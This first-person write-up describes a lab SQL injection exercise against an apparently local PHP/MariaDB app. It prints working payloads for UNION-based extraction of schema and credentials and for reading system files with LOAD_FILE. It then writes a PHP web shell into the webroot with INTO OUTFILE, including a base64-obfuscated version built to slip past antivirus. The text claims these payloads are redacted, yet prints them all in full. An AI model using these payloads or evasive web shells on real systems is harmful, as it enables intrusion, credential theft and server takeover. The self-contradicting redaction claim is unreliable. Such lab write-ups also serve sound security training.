This write-up documents a controlled, lab-only SQL Injection (SQLi) exercise. Use this content for education and defensive guidance only.

## Detection

I probed an endpoint accepting an `id` parameter. Two contrasting inputs produced different responses (one returned a row, another did not), indicating boolean-based SQL injection behavior.

-1' or 1=1 — + (showed entry for id 1 because 1=1 is true)
-1' or 1=2 — + (didn’t showed entry, because 1=2 is false)
## Recon: Determining Query Shape

I used `ORDER BY` style probes to trigger database errors and infer the number of columns in the original `SELECT`. From returned error messages, I concluded the query projects **three columns**. This guides union-style enumeration.

Total columns:

`-1' order by 10 — +` (showed `Unknown column ‘10’ in ‘order clause’`)
`-1' order by 5 — +` (showed `Unknown column ‘5’ in ‘order clause’`)
Tried with lower, `-1' order by 2 — +` (no output, means there are at least 2 columns returning in the select sql query)
Tried with 3, `-1' order by 3 — +` (same behavior)
Tried with 4, `-1' order by 3 — +` (showed `Unknown column ‘4’ in ‘order clause’`)
This confirmed, there are only 3 columns retuning in the sql query.
## Identifying Reflective Columns

Using a union-style probe with distinct markers, I observed which markers were reflected on the page. Two markers (positions 2 and 3) were visible, making those columns useful for union-based extraction.

## Metadata Enumeration

Using reflective columns, I queried database metadata to learn environment details:

Database — security { SQLi Payload: `-1' union select 1,database(),3 — +` }
Version — 10.1.38-MariaDB { SQLi Payload: `-1' union select 1,version(),3 — +` }
User — root@localhost { SQLi Payload: `-1' union select 1,user(),3 — +` }
These indicate a MariaDB instance on Windows under XAMPP and a high-privilege DB user.

## Schema Discovery

I enumerated `information_schema` to list tables and columns. Results included:

**Tables found:** `emails`, `referers`, `uagents`, `users`
I used the following payload to get column names for each tables `-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’emails’ — +`
- **Representative columns:**
— `emails`: `id`, `email_id`
— `referers`: `id`, `referer`, `ip_address`
— `uagents`: `id`, `uagent`, `ip_address`, `username`
— `users`: `id`, `username`, `password`, plus DB internal fields
— -

## Data Extraction

I aggregated results to extract `username:password` pairs and email records. These were lab credentials used only for learning and demonstration.

**Users (username:password)** — examples from lab dataset:
`Dumb:Dumb`, `Angelina:I-kill-you`, `Dummy:p@ssword`, `admin:admin`, `admin1:admin1`, etc.

**Emails** — example entries: `Dumb@dhakkan.com`, `Angel@iloveu.com`, `admin@dhakkan.com`, etc.

— -

## Escalation to RCE

Because the DB user had file I/O capabilities and returned Windows paths, I investigated whether writing a file into the webroot was possible. I performed non-destructive checks (base/data directory, `LOAD_FILE` read checks) which indicated read access to system files.

I then attempted to write a PHP file into the webroot. **All exact commands, encoded payloads, and file-writing payloads are redacted.**

**Attempt 1:** Plain PHP file — quarantined by antivirus.
**Attempt 2:** Obfuscated payload — successfully written and executed in the isolated lab; a `cd` test returned `C:\xampp\htdocs`, confirming command execution.
But first, I have to check do we have permission to use load_file function and if yes, we need to get the base directory of the MySQL installation.
I did that using the following payload, -1' union select 1,(SELECT @@basedir),3--+, Got the output: C:/xampp/mysql
Also, got the directory where the databases and tables are stored using -1' union select 1,(SELECT @@datadir),3--+ -> C:\\xampp\\mysql\\data\\
Now, I know it is an windows OS, and we have enough information about the file system, we can use load_file to read a host file to check if we have permission to do so.
So I used, -1' UNION SELECT 0x41, (SELECT LOAD\_FILE('C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts') AS Result), NULL FROM users--+ to get the host file content.
Now, I need a simple php reverse shell.
So, I used the following PHP code to get a reverse shell:

<?php system($_GET['cmd']); ?>
Converted the code into ASCII and got:

60 63 112 104 112 32 115 121 115 116 101 109 40 36 95 71 69 84 91 39 99 109 100 39 93 41 59 32 63 62
Then, finally made the SQLi Payload

-1' UNION SELECT 0x41, CHAR(60, 63, 112, 104, 112, 10, 9, 115, 121, 115, 116, 101, 109, 40, 36, 95, 71, 69, 84, 91, 39, 99, 109, 100, 39, 93, 41, 59, 10, 63, 62), NULL INTO OUTFILE 'C:\\\\xampp\\\\htdocs\\\\shell.php'--+
I tried to visit http://localhost/shell.php, but got 404, means the file was flaged malicious and deleted by Windows Defender or Antivirus. Then, I changed the PHP code and use obfuscation.

The final PHP code look like this:

<?php eval(base64_decode('CiBlY2hvICJcNzRceDcwXHg3MlwxNDVcNzYiIC4gc2hlbGxfZXhlYygkX0dFVFsiXHg2M1wxNTVceDY0Il0pIC4gIlx4M2NcNTdceDcwXDE2MlwxNDVcNzYiOyA=')); ?>
Now, converted the same to ascii text and passed it to the CHAR function. Hence, the final SQLi Payload looks like this:

-1' UNION SELECT 0x41, CHAR(60, 63, 112, 104, 112, 32, 101, 118, 97, 108, 40, 98, 97, 115, 101, 54, 52, 95, 100, 101, 99, 111, 100, 101, 40, 39, 67, 105, 66, 108, 89, 50, 104, 118, 73, 67, 74, 99, 78, 122, 82, 99, 101, 68, 99, 119, 88, 72, 103, 51, 77, 108, 119, 120, 78, 68, 86, 99, 78, 122, 89, 105, 73, 67, 52, 103, 99, 50, 104, 108, 98, 71, 120, 102, 90, 88, 104, 108, 89, 121, 103, 107, 88, 48, 100, 70, 86, 70, 115, 105, 88, 72, 103, 50, 77, 49, 119, 120, 78, 84, 86, 99, 101, 68, 89, 48, 73, 108, 48, 112, 73, 67, 52, 103, 73, 108, 120, 52, 77, 50, 78, 99, 78, 84, 100, 99, 101, 68, 99, 119, 88, 68, 69, 50, 77, 108, 119, 120, 78, 68, 86, 99, 78, 122, 89, 105, 79, 121, 65, 61, 39, 41, 41, 59, 32, 63, 62), NULL INTO OUTFILE 'C:\\\\xampp\\\\htdocs\\\\shell.php'--+
After this, navigated to http://localhost/shell.php?cmd=cd and got output C:\xampp\htdocs and got Remote Code Execution on the server
